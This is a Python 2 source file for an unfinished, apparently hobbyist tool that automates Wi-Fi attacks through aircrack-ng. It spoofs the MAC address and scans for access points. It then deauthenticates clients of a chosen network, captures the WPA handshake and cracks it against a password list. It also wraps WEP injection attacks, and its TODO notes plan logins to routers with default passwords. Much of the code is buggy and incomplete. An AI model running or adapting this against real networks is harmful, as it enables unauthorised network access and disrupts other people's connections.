#!/usr/bin/python
# -*- coding: utf-8 -*-

# TODO: 
#Seperate manualmode and automatic for readibility.. 
#insert custom macchanger code
#add aireplay code and work on functionality
#add error handleing.. potentially from other version.

#output airodump-ng to a file parse and split important data out for UI
#Figure out way to organize files. 

# Look into text indentation 
#textwrap.dedent('''\
#...         Please do not mess up this text!
#...         --------------------------------
#...             I have indented it
#...             exactly the way
#...             I want it
#...         '''))

# TEST!
# Need to refresh with what works and what needs some tweeking
# 

# 23-Dec-2010	Jason Michael	Initial coding.
# 17-Jan-2011	Jason Michael	Compleated Basic Interface, Airmon functionality
# 25-Oct-2011	Jason Michael	Wrote custom mac address changer
# 29-Mar-2012	Jason Michael	...

#Make modular...Object oriented..
#each attack will be an object and each ap aswell..
#
#OBJECT Access Point
#-attributes of ap, bssid, essid, channel#, signal strength.. etc

#OBJECT Attack
#set up attack vector based on info of ap.
#
#subprocess.close()??

# IDEAS from phone ######

#store all previously attacked ap's in XML. Maybe even all information gathered
#about all ap's in range.  Clients macs essids signal strength

#Read XML or DB of all known info merge with AP info in range.
#basically so you don't have to start from scratch each time

#add functionality to load or delete previous attacks

#multi threading to keep CPU usage down.  ability to do long attacks.
#or try for a quick access

#keep track of everything that has been changed and when a graceful exit
#occurs change back to original i.e mac address, nic mode, write file of Ap

#put on a portable device small chipset..(Wont have the hardware to crack
#maybe see if remote server is able to do the heavy lifting

#once basic information has been acquired by an ap. offere a list of attack 
#options that have the necessary requirements met.  And potentiall make suggestions 
#effectiveness.  Report which attacks have previously been successfull

#work on developing it for andriod, windows and a GUI..


#elinks -dump www.whatever.com > output_file.txt
#cURL -w/--write-out <format>    not exact syntax..
#once logged on find the routers ip.
#use something like elinks or cURL to go the login page(use https if possible)
#search the model and brand in an online database of known default passwords
#automate login and... something...


import os,sys,operator,time
import subprocess as sub
import wirelessclasses as wc

#Usage
def usage():
  print 'Known commands and basic usage for each \n'
  print 'help\n'
  print 'quit\n'
  print 'macchanger\n'
  print 'ifconfig\n'
  print 'iwconfig\n'
  print 'clear\n'
  print 'airmon\n'
  print 'aireplay\n'
  print 'airodump\n'
  print 'aircrack\n'
  print 'airlib\n'
  print 'automatic\n'

# Variables 
bssid = '00:00:00:00:00:00'
essid = ''
channel = 0
client = []
pwfile = 'common-passwords.txt'
invalidArg  = ' invalid command and/or arguement(s)'

airmon = 'airmon-ng - bash script designed to turn wireless cards into monitor mode.'
airodump = 'airodump-ng - a wireless packet capture tool for aircrack-ng'
interface = ''

#flags
root = True
macchanger = False
aircrack = True

# COLORS
W  = "\033[0m";  # white (normal)
BLA= "\033[30m"; # black
R  = "\033[31m"; # red
G  = "\033[32m"; # green
O  = "\033[33m"; # orange
B  = "\033[34m"; # blue
P  = "\033[35m"; # purple
C  = "\033[36m"; # cyan
GR = "\033[37m"; # gray
WB = "\033[1;47m"; # Gray Background
BB = "\033[30;1m";

def main():	#MANUAL Mode for debugging purposes
  try:
    while(1):
      cmd = cmdInput()
      rol = cmd[1:]
      if cmd[0] == 'help' or cmd[0] == 'h':
	help()
      elif cmd[0] == 'quit' or cmd[0] == 'q':
	quit()
      elif cmd[0] == 'clear' or cmd[0] == 'cls':
	clear()
      elif cmd[0] == 'ifconfig':
	ifconfig(cmd[0],rol)
      elif cmd[0] == 'iwconfig':
	ifconfig(cmd[0],rol)
      elif cmd[0] == 'macchanger':
	# TODO check to use macchanger or quick random mac 
	macChange()
      elif cmd[0] == 'automatic':
	auto()
      elif cmd[0] == 'airmon':
	airmon(rol)
      elif cmd[0] == 'airodump':
	airodump(rol)
      elif cmd[0] == 'aircrack':
	aircrack(rol)
      elif cmd[0] == 'aireplay':
	aireplay()
      elif cmd[0] == 'airlib':
	airlib()
      else:	
	print cmd,invalidArg
				
  except KeyboardInterrupt:
    sys.exit('Keyboard Interrupt Closing\n')
		
# setup attack mode (Automatic/Manual)
def setup():
	logo()

	#verify that user is root
	if isRoot() is not True:
		sys.exit('['+R+'N'+W+'] Running as root \nBecome root before running.\n')	
		
	#check that aircrack installed
	p = sub.Popen('whereis aircrack-ng',shell=True,stdout=sub.PIPE)
	output,errors = p.communicate()
	location = output.split()
	if len (location) >= 2:
		aircrackLocation = location[1]
	else:# TODO probably get rid of the install.. just close nicely
		print 'Must install aircrack-ng to use'	
		os.system('apt-get install aircrack-ng')
		
	#check that macchanger installed
	p = sub.Popen('whereis macchanger',shell=True, stdout=sub.PIPE)
	output,errors = p.communicate()
	location = output.split()
	macchanger = False
	if len (location) >= 2:		
		macchangerLocation = location[1]
		macchanger = True
	else:# TODO probably get rid of the install... just use built in if it's not installed
		try:
			print 'Macchanger is '+R+'not'+W+' installed\nwould you like to install it?\notherwise built in randomizer will be used'
			choice = raw_input ("> ")
			choice = choice.lower()
			if choice == 'y':
				#probably want to use subprocess here
				try:
					os.system('apt-get install macchanger')
					macchanger = True
				except:
					pass
			elif choice == 'n':
				macchanger = False;
		except KeyboardInterrupt:
			sys.exit('\nKeyboard Interrupt Closing')

	if macchanger:	#Display if MacChanger is installed or built in is going to be used.
		print W+'['+G+'Y'+W+'] Running as root\n['+G+'Y'+W+'] Aircrack-ng Installed\n['+G+'Y'+W+'] Macchanger Installed' +W
	else:
		print W+'['+G+'Y'+W+'] Running as root\n['+G+'Y'+W+'] Aircrack-ng Installed\n['+R+'N'+W+'] Macchanger Installed' +W
	
	#prompt for manual mode or automatic
	print 'What Mode Would you like to run in?\n['+G+'A'+W+']utomatic or ['+G+'M'+W+']anual'
	while (1):
		try:
			mode = raw_input('> ')
			mode = mode.lower()
			if mode == 'm':
				print G+'Entering Manual Mode..'+W
				main()
			elif mode == 'a':
				auto()
			elif mode == 'q' or mode == 'quit':
				sys.exit('Closing\n')
		except KeyboardInterrupt:
			sys.exit('\nKeyboard Interrupt Closing')

def auto():
		global monitorinterface
		print "Change MAC address?\n"+G+"1."+W+"Don't change MAC"
		print ""+G+"2."+W+"Set Random vendor MAC of the same kind"
		print ""+G+"3."+W+"Set Random vendor MAC of any kind"
		print ""+G+"4."+W+"Set fully random MAC"
		# TODO
		#try:
		#while(1):

		#Prompt to change MAC address
		changeMac = raw_input('> ')
		changeMac = int(changeMac)
		macChanged = False

		setupInterface()	

		if changeMac == 1:
			macChanged = False
		elif changeMac > 1 and changeMac <= 4:
			oldMac, newMac = macChange(changeMac)
			macChanged = True
			print 'Old MAC address:'+R+oldMac+W+'\nNew MAC address:'+G+newMac+W
			
		#sub.call('airmon-ng check kill', shelsl=True)
 	
		
		#Should maybe put output files into a folder
		
		print 'Scanning for 10 seconds...'
		p=sub.Popen('airodump-ng --band bg -w temp --output-format csv  %s'%(monitorinterface),
					  shell=True, 
					  stdout=sub.PIPE,
					  stderr= sub.PIPE,
					  stdin=sub.PIPE)
		time.sleep(10)
		p.terminate()
		#will need to concat the -01.csv 
		f = open('temp-01.csv')

		wholeFile = f.read()
		# TODO Output file can be deleted after all Ap's have been put into a list.  
		lines = wholeFile.split('\n')

		#if the line starts with bssid or a space go to the next line
		#strip the info once the line starts with station mac exit.
		apClientFlag = 0
		allAPS = []
		for line in lines:
			#AP
			if line.startswith('BSSID,') or line.startswith(' '):
				apClientFlag = 0
				continue
			
			#Client
			elif line.startswith('Station MAC'):
				apClientFlag = 1
				continue 

			if apClientFlag == 0: #Read AP's from 
				#strip the the line and get required data.
				l = line.split(',')
				if len(l) <= 1:
					continue
				bssid = l[0]
				channel = l[3]
				encrypt = l[5]
				essid = l[13]
				#make a new ap object
				ap = AP(bssid, channel, encrypt, essid)
				#add to list of 
				allAPS.append(ap)
				#print essid

			if apClientFlag == 1:
				l = line.split(',')
				if len(l) <= 1:
					  continue
				stationMac = l[0]
				clientBssid = l[5]

				newClient = wc.Client(stationMac, clientBssid)
				for ap in allAPS:
					if wc.AccessPoint.bssid == newClient.bssid:
						wc.AccessPoint.addClient(newClient)

		f.close()
		# TODO delete temp file 

		#sub.call('rm airdump-01.csv')
		print 'Select Access Point to attack'
		i = 1
		for ap in allAPS:
			#if i == 6:
				##break
			print G+'%d.'%(i)+W+str.strip(ap.essid),ap.encrypt
			i+=1
				
		choice = raw_input('> ')
		accessPoint = allAPS[int(choice)-1]
		
		print 'Initiating Attack on ESSID:' + accessPoint.essid + '\nBSSID:' + accessPoint.bssid + '\nChannel:' + accessPoint.channel + '\nEncryption:' + accessPoint.encrypt 
		print 'Associated Clients:' + str(accessPoint.numberOfClients)
		for c in accessPoint.clientsList:
			print 'Station Client: ' + c
		
		p=sub.Popen('airodump-ng --bssid %s -c %s -w airdump %s'%(accessPoint.bssid,accessPoint.channel, monitorinterface),
					  shell=True, 
					  stdout=sub.PIPE,
					  stderr= sub.PIPE,
					  stdin=sub.PIPE)
		print 'Monitor set up'
#*****************************************************************************************************
# TODO Check to make sure associated clients are being stored for targeted AP. 
#after the monitoring is set up then continue to deauth and look into other methods of 
#obtaining the handshake.  

# Need to monitor airodump-ng to see when the handshake comes in.  once it has begin cracking
# have an option to either pipe john the ripper or password file attack.  
#setup old dlink for testing the later half of the attack:deauth, aquiring the handshake and cracking.

		#deauth
		pr=sub.Popen('aireplay-ng -0 10 -a %s -c 00:22:FA:26:41:D8 %s'%(accessPoint.bssid, monitorinterface), shell=True, stdout=sub.PIPE)
		print 'doing deauth.. wait 30.'
		time.sleep(30)
		print 'woke up'
      
		aircrack = sub.Popen('aircrack-ng -l PasswordFile -w common-passwords.txt airdump-02.cap', shell=True, stdout=sub.PIPE)
		print 'cracking'		
		#output,errors = p.communicate()
		#./john --incremental --stdout | 	aircrack-ng -b 00:21:29:cf:c4:7c -w - /home/jay/aircrack/mrcoffeeprince-01.cap
		
		time.sleep(15)
		p.terminate()
		aircrack.terminate()
		print 'airdump and aircrack terminated'
		#print 'output'+output
		password = open('PasswordFile')
		print 'opened passwordfile'
		passwordFile = password.read()
		print 'passwordfile'+passwordFile
		print 'about to clean up'
		cleanUp(macChanged)
		sys.exit('done')
		

		#while choice =='' and type(choice) != int:
			#choice = raw_input('> ')
				
def setupInterface():	#Locate interfaces with the ability to switch to monitor mode
	global interface, monitorinterface
	
	proc = sub.Popen('iwconfig', shell=True, stdout=sub.PIPE,stderr=sub.PIPE)
	stdout=proc.communicate()[0]
	lines=stdout.split('\n')

	ifaces = []		# list of all interfaces capable of switching to monitor mode 
	monitorIfaces = []	# list of interfaces already in monitor mode 

	for line in lines:	#Checks for any interfaces already in monitor mode
		if not line.startswith(' ') and line[0:line.find(' ')] != '':
			current_iface=line[0:line.find(' ')]
			ifaces.append(current_iface)
			
		if line.find('Mode:Monitor') != -1:
			monitorIfaces.append(current_iface)
			
	if monitorIfaces != []:
		print 'Interfaes already in monitor mode'
		for i in monitorIfaces:
			print G+i+W
	if ifaces != []:
		print 'Select interface to use'
		index = 1
		for i in ifaces:
			print G+'%d.' % (index)+W+i 
			index+=1
	else:
		print 'there were no avaliable interfaces to be used'
		sys.exit()		
	
	try:
		# TODO rethink algorythm for error checking.
		#also if selection is already enabled dont turn it on again.. 
		#MOVE AIRMON-NG CALL DOWN HERE
		choice = raw_input('> ')
		while choice =='' and int(choice) > len(ifaces) and type(choice) is not type(int):
			print 'not a valid selection'
			choice = raw_input('>> ')
		choice = int(choice)
		if choice <= len(ifaces):
			if ifaces[choice-1] in monitorIfaces:
				print 'mon already on '
				monitorinterface  = ifaces[choice-1]
			else:
				interface = ifaces[choice-1]
				p=sub.Popen('airmon-ng start %s' % (interface), shell=True, stdout=sub.PIPE,stderr=sub.PIPE)				
				output,errors=p.communicate()
				# find what interface monitor mode was enabled on and set to interface
				lines = output.split('\n')
				for line in lines:
					if line.find('(monitor mode enabled on') != -1:
						monitorinterface = line[29:33]
				
			#print ifaces
		else:
			print 'not valid selection'
					
	except:
		sys.exit('exit')

def macChange(arg):	#add other options for changing mac address
			#maybe a combination of using both would be a good idea. 
			#only offer macchanger options if it is installed otherwise only display built in
	global interface
	newMac=''
		
	if macchanger == True:
		if arg == 2:
			option = '-a'
		elif arg == 3:
			option = '-A'
		elif arg == 4:
			option = '-r'

		p = sub.Popen('macchanger -s %s'%(interface),shell=True,stdout=sub.PIPE,stderr=sub.PIPE)
		output=p.communicate()[0]
		oldMac = output[13:31]
		#print oldMac,'old'
		sub.call('ifconfig %s down'%(interface),shell=True)
		#print 'iface down'
		p = sub.Popen('macchanger %s %s'%(option, interface),shell=True,stdout=sub.PIPE,stderr=sub.PIPE)
		output,errors=p.communicate()
		#print 'output',output
		#print 'errors',errors
		#print 'mac changed'		
		sub.call('ifconfig %s up'%(interface),shell=True)
		#print 'iface up'		
		lines=output.split('\n')
		#print 'lines',lines
		for line in lines:
			if line.startswith('Faked MAC:'):
				#print 'fake'
				#print 'line',line
				#print len(line)
				newMac = line[13:31]
				#print newMac,'new'
	# TODO	
	elif macchanger == False:	
		print 'incomplete built in macchanger'
		if arg == 2:
			option = '-a'
	
		elif arg == 4:
			option = '-r'
		elif arg == 5:
			option = '-e'

		#how to find HWaddr with out macchanger
		#ifconfig eth0 hw ether 01:02:03:04:05:06
		# TODO Get old mac address..
		oldMac = '00:00:00:00:00:00'

		mc = MacChanger()
		newMac = mc.changeMac(option, oldMac)

		sub.call('ifconfig %s down'%(interface), shell=True)
		sub.call('ifconfig %s hw ether %s'%(interface, newMac), shell=True)
		sub.call('ifconfig %s up'%(interface), shell=True)
		print 'new' +newMac
		print 'old' +oldMac
	return oldMac, newMac
	
def cleanUp(macChanged):
	global interface, monitorinterface
	#change mac back if needed
	#turn monitor mode off
	if macChanged:
		sub.call('ifconfig %s down' % (interface), shell=True)
		sub.call('ifconfig %s hw ether %d'%(interface,oldMac), shell=True)
		sub.call('ifconfig %s up' %(interface), shell=True)
		
	sub.Popen('airmon-ng stop %s'%(interface), shell = True)
	sub.Popen('airmon-ng stop %s'%(monitorinterface), shell=True)
	#sub.Popen('rm airdump-0*', shell=True)
	print 'successful..?'

	# Remove all files that arent needed anymore

	
def cmdInput():	
	#STRIP WHITE SPACE FROM THE FRONT!
	cmd = ''
	try:
		while cmd is '':
			cmd = raw_input('> ')
	except KeyboardInterrupt:
		sys.exit('Keyboard Interrupt\n')
	except:
		print cmd, invalidArg,'duhh'
		cmdInput()
	cmd = cmd.lower()
	commandLine = cmd.split()
	return commandLine
	
#turn networkcard  to monitor mode
def airmon(args):
  
	#option 
	if len(args) == 1:

		airmonString = 'airmon-ng', args[0]
		print aircrackRun(airmonString)
			
	#mode and interface
	elif len(args) == 2:

		airmonString = 'airmon-ng', args[0], args[1]
		print aircrackRun(airmonString)

	#mode, interface and channel # passsed
	elif len(args) == 3:

		airmonString = 'airmon-ng', args[0], args[1], args[2] 
		print aircrackRun(airmonString)
			
	else:

		print args,invalidArg
		
def aireplay(args):
	# TODO
	#what is required for defauth..
	if len(args) == 1:
		aireplayString = 'aireplay-ng', args[0]
		
	print 'incomplete'
		
def aircrack(args):
	# TODO
	if len(args) == 1:
		aircrackString = 'aircrack-ng',args[0]
	
	print 'incomplete'

def arilib(args):
	# TODO
	if len(args) == 1:
		airlibString = 'airlib-ng',args[0]
		
	print 'incomplete'

def airodump(args):
	# TODO
	if len(args) == 1:
	  
		 airodumpString = 'airodump-ng', args[0]
		 dump = aircrackRun(airodumpString)
		 print 'airodump',dump
		 
	elif len(args) == 2:
		
		 airodumpString = 'airodump-ng', args[0], args[1]
		 dump = aircrackRun(airodumpString)
	
def aircrackRun(String):
	#Runs any aircrack program passed to function
	joinString = ' '.join(String)
	p = sub.Popen(joinString, shell=True, stdout = sub.PIPE)
	output,errors = p.communicate()
	retcode = p.returncode()
	print 'retcode'
	#print retcode
	return 1
			
def ifconfig(cmd,args):
	
	if len(args) == 0:
	  
		proc = sub.Popen(cmd,shell=True,stdout=sub.PIPE)
		output,errors = proc.communicate()
		print output
		
	
	elif len(args) == 1:
		
		proc = sub.Popen(cmd+' '+args[0],shell=True,stdout=sub.PIPE)
		output,errors = proc.communicate()
		print output
	
	else:
		print cmd,args,invalidArg
		
def clear(): os.system('clear')#clears the screen
		
def help():  #man mode..
  usage()

def quit():  sys.exit("closing..")

def isRoot(): #Check for root privliges

  user = os.getenv('LOGNAME')	
  if user == 'root':
    return True
    
  return False

def logo():
	clear()
	print BB+"                             "+W+",--."+BB+"   "
        print "                            "+W+"{    }"+BB+"  "
        print "                            "+W+"K,   }"+BB+"  "
        print "                           "+W+"/  ~Y`"+BB+"   "
        print "                      "+W+","+BB+"   "+W+"/   /"+BB+"     "
        print "                     "+W+"{_'-K.__/"+BB+"      "
        print "                      "+W+"`/-.__L._"+BB+"     "
        print "                      "+W+"/  ' /`\_}"+BB+"    "
        print "                     "+W+"/  ' /"+BB+"         "
        print "             ____   "+W+"/  ' /"+BB+"          "
	print "      ,-'~~~~    ~~"+W+"/  ' /"+BB+"_          "
	print "    ,'             ``~~~  ',        "
	print "   (                        Y       "
	print "  {                         I       "
	print " {      -                    `,     "
	print " |       ',                   )     "
	print " |        |   ,..__      __. Y      "
	print " |    .,_./  Y "+W+"' /"+BB+" ^Y   J   )|      "
	print " \           |"+W+"' /"+BB+"   |   |   ||      "
	print "  \          L_"+W+"/"+BB+"    . _ (_,.'(      "
	print "   \,   ,        ^^""' / |      )     "
	print "     \_  \          /,L]     /      "
	print "       '-_~-,       ` `   ./`       "
	print "          `'{_            )         "
	print "              ^^\..___,.--`         "+W

#FUNCTIONALITY 
#-e, --endding    Don't change the vendor bytes.
#-a                Set random vendor MAC of any kind.
#-r, --random   Set fully random MAC.  
#-m, --mac XX:XX:XX:XX:XX:XX     Set the MAC XX:XX:XX:XX:XX:XX
#-apple,         Set random mac with vender MAC from Apple

#TODO
#Add in functionality to spoof an already authenticated user
#check scope of newMac maybe make it global
#TO-TEST	-apple	-m	

#get old mac before changing
class MacChanger:
	import random
	import string
	
	def changeMac(self, option, oldMac): # Test
		if option.lower() == '-r': #completely randomize mac
			return self.randomMac()       
		elif option.lower() == '-a':     #change only vender get vender codes
			return self.changeVender(oldMac)      
		elif option.lower() == '-apple':    #change vender to apple
			return self.appleMac()
		elif option.lower() == '-e':	#change only the ending 
			return self.changeEnding(oldMac)
		elif option.lower() == '-m':	#user custom Mac address
			return self.customMac()	#this is going to need to take the custon mac...
	  
	def appleMac(self): # TODO use old mac endpeice or randomize new..?
		newMac = ''
		fr = open('appleMacs.txt')
		for line in fr:        #read mac vender codes from file
			appleMacs.append(line)    
		appleVender = appleMacs[self.random.randint(0,appleMacs.length)]    #random choice of mac venders
		newMac = '{0}:{1}:{2}:{3}'.format(appleVender[:2], appleVender[2:4], appleVender[4:6], oldMac[9:]) # newMac invalid syntax
		# seperate the apple vender and add on the original NIC
		return newMac
	  
	def randomMac(self): 
		newMac = ''
		for i in range(6):
			newMac = newMac.join(self.random.sample(self.string.hexdigits, 2)) # one random octet
		      
		newMac = '{0}:{1}:{2}:{3}:{4}:{5}'.format(newMac[:2], newMac[2:4],newMac[4:6],newMac[6:8],newMac[8:10],newMac[10:12])     #combine each octet
		return newMac
	  
	def changeVender(self, oldMac):
		newMac = ''
		for i in range(3):
			newMac = newMac.join(self.random.sample(self.string.hexdigits, 2)) #one random octet
	      
		newMac = '{0}:{1}:{2}:{3}'.format(newMac[:2], newMac[2:4],newMac[4:6],oldMac[9:])
		return newMac
		#take the three new octets and the old nic

	def changeEnding(self, oldMac):
		newMac = '' 
		for i in range(3):
			newMac = newMac.join(self.random.sample(self.string.hexdigits, 2)) #one random octet
		newMac = '{0}:{1}:{2}:{3}'.format(oldMac[:8], newMac[:2], newMac[2:4],newMac[4:6])
		return newMac
		  
	def customMac(self, newMac):	
		#check that the mac address given is in the correct format
		print 'No MAC validation has been done'
		return newMac

#TODO 
#Use packetforge-ng to create encrypted packets for packet injection
#use with chopchop and fragmentation attacks

class aireplayNG:
	def __init__(self, replayInterface, bssid, dmac, smac, essid):
		self.replayInterface = replayInterface
		self.bssid = bssid
		self.dmac = '-d %s'%(dmac)
		self.smac = '-s %s'%(smac)
		self.essid = '-e %s'%(essid)
		self.minlen = 0
		self.maclen = 0
		self.type = '-u' #frame control type field
		self.subt = '-v' #frame control subtype field

	
	def deauth():	#wpa --deauth=<count>
		print 'starting deauth attack'
		#TODO set up options
		count = 0
		sub.Popen('aireplay-ng --deauth=%d %s'%(count, replayInterface), shell=True)

	def fakeauth():	#WEP --fakeauth=<delay>
		print 'starting fakeauth attack'
		#TODO set up options
		delay = 0
		# -e <essid> -o <npackets> -q <seconds> -v <prga> -T n 
		sub.Popen('aireplay-ng -1 %d -e %s %s'%(delay, essid, replayInterface), shell=True)

	def interactive():	#  --interactive
		print 'starting interactive attack'
		#TODO set up options
		sub.Popen('aireplay-ng -2 %s'%(replayInterface), shell=True)

	def arpreplay():	#WEP --arpreplay
		print 'starting arp replay attack'
		#TODO set up options
		#-j 
		sub.Popen('aireplay-ng -3 %s'%(replayInterface), shell=True)

	def chopchop():	#WEP --chopchop
		print 'starting chop chop attack'
		#TODO set up options
		sub.Popen('aireplay-ng -4 %s'%(replayInterface), shell=True)

	def fragment():	#Main WEP  --fragment
		print 'starting fragment attack'
		#TODO set up options
		#-k <IP> (set destination IP in fragments)
		#-l <IP> (set source IP in fragments)
		sub.Popen('aireplay-ng -5 %s'%(replayInterface), shell=True)

	def caffelatte():	#WEP --caffe-latte
		print 'starting caffe latte attack'
		#TODO set up options
		sub.Popen('aireplay-ng -6 %s'%(replayInterface), shell=True)

	def cfrag():	#Main WEP --cfrag
		print 'starting cfrag attack'
		#TODO set up options
		sub.Popen('aireplay-ng -7 %s'%(replayInterface), shell=True)

	def testInjection():	#Test Packet Injection --test
		print 'Testing Packet Injection'
		sub.Popen('aireplay-ng -9 %s'%(replayInterface), shell=True)

#Keep an active list of access points where there has been an attempt made to 
#break the perimeter. 

setup()
